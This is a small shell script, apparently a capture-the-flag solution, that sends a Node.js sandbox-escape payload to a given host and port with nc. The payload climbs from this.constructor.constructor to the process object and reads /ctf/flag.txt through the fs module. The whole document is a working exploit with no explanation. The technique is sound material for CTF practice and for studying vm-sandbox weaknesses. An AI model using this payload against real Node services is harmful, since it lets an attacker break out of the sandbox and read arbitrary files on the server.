#!/bin/sh

if [ ! $# -eq 2 ]; then
	cat <<EOF >&2
Usage: $0 HOST PORT

EOF
	exit 1
fi

nc "$1" "$2" <<EOF
this.constructor.constructor('return process')().mainModule.require('fs').readFileSync('/ctf/flag.txt')
q
EOF
